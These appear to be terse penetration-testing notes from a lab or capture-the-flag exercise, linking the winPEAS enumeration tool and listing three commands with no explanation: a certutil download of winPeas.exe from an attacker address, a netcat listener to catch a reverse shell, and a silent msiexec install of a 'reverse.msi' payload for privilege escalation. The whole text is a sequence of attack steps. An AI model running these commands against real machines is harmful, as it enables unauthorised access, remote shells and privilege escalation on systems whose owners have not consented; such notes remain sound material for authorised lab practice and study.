_____

https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS


```cmd
certutil.exe -f -urlcache -split http://10.10.14.7/winPeas.exe winPeas.exe
```

```bash
sudo rlwrap nc -lvnp 443
```

```cmd
msiexec /quiet /qn /i C:\reverse.msi
```
